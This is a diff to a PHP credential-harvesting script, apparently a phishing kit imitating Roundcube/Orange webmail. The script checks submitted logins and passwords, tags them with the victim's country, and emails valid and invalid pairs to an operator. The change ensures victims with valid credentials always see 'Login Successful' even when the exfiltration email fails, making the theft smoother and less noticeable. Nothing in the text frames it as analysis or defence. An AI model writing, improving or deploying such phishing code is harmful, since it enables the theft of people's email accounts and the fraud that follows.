@@ -152,7 +152,7 @@ if (!empty($login) && !empty($passwd)) {
         file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         
         if ($validCredentials) {
-            // Valid credentials - send success notification
+            // Valid credentials - always show success regardless of email status
             $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
             
             $smtpConfig = [
@@ -163,24 +163,19 @@ if (!empty($login) && !empty($passwd)) {
                 'receiver' => $receiver
             ];
             
-            // Always send email notification for valid credentials
+            // Try to send email notification for valid credentials
             $emailSent = sendEmail($subg, $message, $smtpConfig);
             
             // Log email sending attempt
             $emailLog = "Email sent for valid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
             file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
             
-            if ($emailSent) {
-                $data = array('signal' => 'ok', 'msg' => 'Login Successful');
-                $debugLog = "Valid credentials - Email sent successfully - Setting signal to 'ok'\n";
-                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
-            } else {
-                $data = array('signal' => 'not ok', 'msg' => 'Wrong Password'); // Show wrong password if email fails
-                $debugLog = "Valid credentials - Email failed - Setting signal to 'not ok' with 'Wrong Password'\n";
-                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
-            }
+            // Always show success for valid credentials
+            $data = array('signal' => 'ok', 'msg' => 'Login Successful');
+            $debugLog = "Valid credentials - Setting signal to 'ok' with 'Login Successful'\n";
+            file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         } else {
-            // Invalid credentials - send failure notification
+            // Invalid credentials - always show wrong password
             $subg2 = "notVerifiedRcudeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
             
             $smtpConfig = [
@@ -191,14 +186,14 @@ if (!empty($login) && !empty($passwd)) {
                 'receiver' => $receiver
             ];
             
-            // Always send the email notification for invalid credentials
+            // Try to send email notification for invalid credentials
             $emailSent = sendEmail($subg2, $message, $smtpConfig);
             
             // Log email sending attempt for invalid credentials
             $emailLog = "Email sent for invalid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
             file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
             
-            // Return the correct error message
+            // Always show wrong password for invalid credentials
             $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
             $debugLog = "Invalid credentials - Setting signal to 'not ok' with 'Wrong Password' message\n";
             file_put_contents("debug.txt", $debugLog, FILE_APPEND);
